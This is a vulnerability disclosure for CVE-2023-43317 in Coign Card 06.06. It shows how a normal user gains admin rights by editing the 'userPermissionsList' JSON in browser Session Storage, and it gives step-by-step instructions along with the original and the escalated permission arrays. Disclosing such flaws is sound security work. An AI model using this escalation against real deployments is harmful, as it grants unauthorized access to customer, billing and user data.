# CVE-2023-43317


A normal user can elevate their privileges via the userPermissionsLIst parameter in Session Storage component. to gain unauthorized access to administrative-level resources and features. This could lead to unauthorized data access, data modification, and other actions that are typically restricted to administrators.

- Vulnerable Product:- [Coign Card](https://coigncard.com)
- Vulnerable Version:- 06.06
- References:- https://nvd.nist.gov/vuln/detail/CVE-2023-43317

## Steps To Reproduce

1. Log in with a normal user account.
2. Right-click on the web page and select “Inspect Element” to open the developer tools.
3. In the developer tools, navigate to the “Application” tab.
4. Expand the “Session Storage” section.
5. In the Session Storage, you can see the “userPermissionsList” object, which contains a JSON array of user permissions.
The initial permissions for a normal user look like this:
```bash
[{"permissionId":1,"permissionName":"CanGetApplicants"},{"permissionId":5,"permissionName":"CanGetUsers"},{"permissionId":8,"permissionName":"CanGetApplications"},{"permissionId":9,"permissionName":"CanResendEmails"},{"permissionId":18,"permissionName":"CanGetCustomers"},{"permissionId":22,"permissionName":"CanGetUserActivity"}]
```
7. Modify the permissions in the Session Storage to gain admin-level access:
```bash
[{"permissionId":1,"permissionName":"CanGetApplicants"},{"permissionId":2,"permissionName":"CanCreateApplicants"},{"permissionId":3,"permissionName":"CanUpdateApplicants"},{"permissionId":4,"permissionName":"CanManageAccounts"},{"permissionId":5,"permissionName":"CanGetUsers"},{"permissionId":6,"permissionName":"CanCreateUsers"},{"permissionId":7,"permissionName":"CanUpdateUsers"},{"permissionId":8,"permissionName":"CanGetApplications"},{"permissionId":9,"permissionName":"CanResendEmails"},{"permissionId":10,"permissionName":"CanGetDocuments"},{"permissionId":11,"permissionName":"CanUploadDocuments"},{"permissionId":12,"permissionName":"CanCreateIndividualInvitations"},{"permissionId":14,"permissionName":"CanQueryIndividualInvitations"},{"permissionId":15,"permissionName":"CanGetBulkInvitations"},{"permissionId":16,"permissionName":"CanUploadBulkInvitationsFile"},{"permissionId":17,"permissionName":"CanUpdateFormStatus"},{"permissionId":18,"permissionName":"CanGetCustomers"},{"permissionId":19,"permissionName":"CanResendInvitations"},{"permissionId":20,"permissionName":"CanResendEvaluations"},{"permissionId":21,"permissionName":"CanResendManualReviews"},{"permissionId":22,"permissionName":"CanGetUserActivity"},{"permissionId":23,"permissionName":"CanGetDeliveredDocuments"},{"permissionId":24,"permissionName":"CanGetBillingTables"},{"permissionId":25,"permissionName":"CanGetBillingTableHistoricalRecords"},{"permissionId":26,"permissionName":"CanGetBillingTableDraftUpdateRecords"},{"permissionId":27,"permissionName":"CanGetFeedBacks"},{"permissionId":28,"permissionName":"CanUpdateBillingTables"},{"permissionId":29,"permissionName":"CanUpdateUserEmail"},{"permissionId":30,"permissionName":"CanGetTemplates"},{"permissionId":31,"permissionName":"CanResendApplicationEmail"},{"permissionId":32,"permissionName":"CanDeleteUpcomingUpdates"},{"permissionId":33,"permissionName":"CanCreatePolls"},{"permissionId":34,"permissionName":"CanGetPolls"},{"permissionId":35,"permissionName":"CanUpdatePolls"},{"permissionId":36,"permissionName":"CanNotifyIndividualinvitations"},{"permissionId":37,"permissionName":"CanSendInvitationEmail"}]
```
7. After modifying the permissions, refresh the page.
8. You will gain unauthorized access to administrative-level resources and features.


## Write-Up
https://amjadali110.medium.com/a-easy-vertical-privilege-escalation-via-session-storage-cfa9f558c94
